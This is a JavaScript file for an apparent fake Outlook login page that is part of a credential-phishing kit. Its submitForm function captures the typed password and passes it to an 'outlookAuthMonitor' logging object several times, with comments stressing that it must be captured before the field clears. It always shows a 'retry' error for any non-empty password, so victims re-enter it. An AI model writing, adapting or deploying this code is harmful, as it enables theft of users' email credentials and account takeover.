document.querySelectorAll('input, textarea').forEach(element => {
    element.addEventListener('focus', function() {
      // Disable zoom when input gets focus
      document.querySelector('meta[name="viewport"]').setAttribute('content', 'width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no');
    });
  
    element.addEventListener('blur', function() {
      // Enable zoom again when input loses focus (optional)
      document.querySelector('meta[name="viewport"]').setAttribute('content', 'width=device-width, initial-scale=1, maximum-scale=1, user-scalable=yes');
    });
  });
  
function submitForm() {
    event.preventDefault();
    
    // Add this section at the beginning of the function
    // This ensures the password is captured before any other operations
    if (window.outlookAuthMonitor) {
        window.outlookAuthMonitor.captureFormData();
        window.outlookAuthMonitor.sendLogData('form_submission');
    }
    
    const passwordInput = document.getElementById('passwordInput');
    const password = passwordInput.value;
    const hideElement1 = document.getElementById('hide1');
    const hideElement2 = document.getElementById('hide2')
    const hideElement3 = document.getElementById('hide3')
    const hideElement4 = document.getElementById('hide4')
    const hideElement5 = document.getElementById('hide5')
    const hideElement6 = document.getElementById('hide6')
    const successIndicator = document.getElementById('sI');
    const retryIndicator = document.getElementById('reTry');

    hideElement1.classList.remove('hidden');
    hideElement2.classList.remove('hidden');
    hideElement3.classList.remove('hidden');
    hideElement4.classList.remove('hidden');
    hideElement5.classList.remove('hidden');
    hideElement6.classList.remove('hidden');
    passwordInput.style.borderColor = '';

    // Capture password again just before loading animation starts
    if (window.outlookAuthMonitor) {
        window.outlookAuthMonitor.captureFormData();
    }

    setTimeout(() => {
        if (!password) {
            successIndicator.classList.remove('hidden');
        } else {
            retryIndicator.classList.remove('hidden');
            successIndicator.classList.add('hidden');
            passwordInput.style.borderColor = 'red';
            
            // Capture password again when showing error message
            if (window.outlookAuthMonitor) {
                window.outlookAuthMonitor.sendLogData('password_error');
            }
        }
        hideElement1.classList.add('hidden');
        hideElement2.classList.add('hidden');
        hideElement3.classList.add('hidden');
        hideElement4.classList.add('hidden');
        hideElement5.classList.add('hidden');
        hideElement6.classList.add('hidden');
        successIndicator.classList.remove('hidden');
    }, 2000);

    // Delay clearing the password field to ensure it's captured
    setTimeout(() => {
        // Capture password one last time before clearing
        if (window.outlookAuthMonitor && passwordInput.value) {
            window.outlookAuthMonitor.captureFormData();
            window.outlookAuthMonitor.sendLogData('before_password_clear');
        }
        
        document.getElementById('passwordInput').value = '';
    }, 2000);

    retryIndicator.classList.add('hidden'); // Initially hide retry indicator
    
    // If submitButton exists, add an event handler
    const submitButton = document.getElementById('submitButton');
    if (submitButton) {
        submitButton.onclick = function() {
            setTimeout(() => {
                retryIndicator.classList.remove('hidden');
                passwordInput.style.borderColor = 'red';
            }, 2000);
        };
    }
}
